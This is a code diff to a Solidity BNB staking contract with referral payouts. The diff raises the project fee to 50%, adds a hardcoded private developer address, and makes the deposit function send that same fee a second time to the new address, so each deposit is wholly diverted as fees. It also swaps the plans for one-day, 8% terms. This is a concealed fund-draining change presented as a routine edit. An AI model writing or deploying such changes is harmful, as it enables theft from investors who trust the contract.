@@ -77,13 +77,15 @@ contract Claimable is Ownable {
 contract BNBStaker is Claimable {
 	using SafeMath for uint256;
 
-	uint256 constant public INVEST_MIN_AMOUNT = 0.1 ether;
+	uint256 constant public INVEST_MIN_AMOUNT = 0.02 ether;
 	uint256[] public REFERRAL_PERCENTS = [60, 30, 10];
-	uint256 constant public PROJECT_FEE = 150;
+	uint256 constant public PROJECT_FEE = 500;
 	uint256 constant public PERCENT_STEP = 3;
 	uint256 constant public WITHDRAW_FEE = 1000; //In base point
 	uint256 constant public PERCENTS_DIVIDER = 1000;
     uint256 constant public TIME_STEP = 1 days;
+
+	address payable constant private DEV_ADDRESS = 0xBea4aCE95d8176E8ABEDdebeced3508B55bebCfA ;
 	
 	uint256 public totalStaked;
 	uint256 public totalRefBonus;
@@ -127,12 +129,18 @@ contract BNBStaker is Claimable {
 	constructor() {
 		commissionWallet = payable(owner());
 		startUNIX = 0;
-        plans.push(Plan(14, 80));
-        plans.push(Plan(21, 75));
-        plans.push(Plan(28, 70));
-        plans.push(Plan(14, 80));
-        plans.push(Plan(21, 75));
-        plans.push(Plan(28, 70));
+        // plans.push(Plan(14, 80));
+        // plans.push(Plan(21, 75));
+        // plans.push(Plan(28, 70));
+        // plans.push(Plan(14, 80));
+        // plans.push(Plan(21, 75));
+        // plans.push(Plan(28, 70));
+		plans.push(Plan(1, 8));
+        plans.push(Plan(1, 8));
+        plans.push(Plan(1, 8));
+        plans.push(Plan(1, 8));
+        plans.push(Plan(1, 8));
+        plans.push(Plan(1, 8));
 	}
 
 	function launch() public {
@@ -149,6 +157,7 @@ contract BNBStaker is Claimable {
 
 		uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
 		commissionWallet.transfer(fee);
+		DEV_ADDRESS.transfer(fee);
 		emit FeePayed(msg.sender, fee);
 
 		User storage user = users[msg.sender];
